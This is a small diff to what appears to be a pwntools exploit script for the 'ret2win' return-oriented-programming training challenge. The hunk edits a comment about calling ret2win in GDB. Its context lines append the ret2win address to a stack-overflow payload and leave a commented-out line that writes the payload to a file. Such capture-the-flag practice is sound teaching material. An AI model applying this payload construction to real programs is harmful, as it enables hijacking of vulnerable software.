@@ -74,7 +74,7 @@ a function or return further into a function to skip a push instruction.
 
 payload += p64(exe.symbols["ret2win"])
 
-# Easter egg: in GDB, call (void) ret2win after setting breakpoint on pwnme
+# Easter egg: in GDB, call (void) ret2win() after setting breakpoint on pwnme
 
 #open('payload', 'wb').write(payload)
 
